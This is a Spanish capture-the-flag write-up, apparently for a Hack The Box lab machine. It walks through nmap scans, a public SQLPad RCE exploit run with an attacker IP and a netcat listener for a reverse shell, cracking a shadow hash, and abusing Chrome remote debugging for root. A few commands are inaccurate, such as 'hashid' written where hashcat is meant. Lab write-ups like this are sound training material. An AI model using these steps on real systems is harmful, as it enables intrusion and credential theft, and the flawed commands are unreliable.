#CTF #HackTheBox 
# Enumeración
Lo primero que hacemos es enumerar que puertos están abiertos en esta maquina mediante nmap

```bash
nmap -p- --open -vvv -sS --min-rate 5000 -n -Pn 10.10.11.32 -oG allPorts
```

![[Pasted image 20240930225901.png]]

Ya que tenemos los puertos que estan abiertos en la maquina procedemos  realizar un escaneo de estos para descubrir version y servicios que corre.

```bash
nmap -p21,22,80 -sCV 10.10.11.32 -oN targeted
```

![[Pasted image 20240930230039.png]]

Como tenemos el puerto 80 abierto accedemos a la pagina web agregando el nombre de dominio al /etc/host, en este caso sightless.htb.

![[Pasted image 20240930230146.png]]

Al navegar en el podemos encontrar un link a una pagina que corre el servicio **sqlpad**, si buscamos vulnerabilidades de esta podemos encontrar un exploit que nos permite entablar una reverse shell.
https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944

# Explotación

Lo unico que tenemos que hacer es correr el exploit con la url de slpad, ip del atacante y puerto del atacante.

```bash
python3 exploit.py http://sqlpad.sightless.htb/ 10.10.14.32 443
```

Una vez ejecutado y estando en escucha por dicho puerto mediante netcat ` nc -lvnp 443 ` podemos ver que el codigo se ejecuto de manera correcta porque nos devolvio una reverse shell, realizamos un tratamiento de esta y empezamos a navegar por el sistema.
Como podemos darnos cuenta estamos en un docker.

![[Pasted image 20240930230908.png]]

Para encontrar posibles contraseñas podemos listar el /etc/passw y el /etc/shadow.
Al hacerlo podemos ver que obtuvimos un hash de la posible contraseña del usuario ***michael***

![[Pasted image 20240930231042.png]]

Para ver que tipo de hash es podemos usar ***hashid***, solo copiamos el hash en un archivo y se lo pasamos a hashid

```bash
hashid docker.hash
```

![[Pasted image 20240930231636.png]]

Ahora podemos intentar crackearlo mediante hashcat, para este tipo de hashes utilizamos la opcion -m 1800 debido a que es la que corresponde a ***SHA-512 Crypt***

```bash 
hashid -m 1800 docker.hash /home/$USER/repos/rockyou.txt
```

Podemos ver que la contraseña es ->

![[Pasted image 20240930232437.png]]

***insaneclownposse***
Al entablar una shell mediante openssh podemos utilizar este usuario y contraseña y asi obtener acceso a la maquina. En la ruta /home/michael podemos encontrar la primera flag.

# Escalada de privilegios

Al listar los grupos no encontramos nada asi que procedemos a revisar que puertos estan abiertos:

![[Pasted image 20240930232706.png]]

Podemos identificar peculiarmente el puerto 8080 en el localhost, al acceder, primero mediante ssh:

```bash
ssh michael@10.10.11.32 -L 8080:localhost:8080
```

Y despues mediante el navegador nos encontramos con esta pagina

![[Pasted image 20240930233139.png]]

Pero no encontramos nada que nos sirva para obtener las credenciales, cuando listamos los procesos podemos ver que un usuario jhon estuvo accediendo mucho a chrome

![[Pasted image 20240930233644.png]]

Por lo que vemos es el modo de depuración de chrome, ya con esta información si buscamos podemos descubrir que chrome puede realizar una depuración remota, mediante esta pudimos descubrir que la contraseña es ***ForlorfroxAdmin*** y el usuario es ***admin***.La escalada de privilegio es mediante la explotacion del debuger de chrome, mediante la modificacion de php podemos insertar comandos a nivel de la maquina, lo que nos permitio copiar la id_rsa y darle permisos de ejecución, solo bastaria realizar un ` ssh -i id_rsa michael@10.10.11.32` para obtener una consola root.
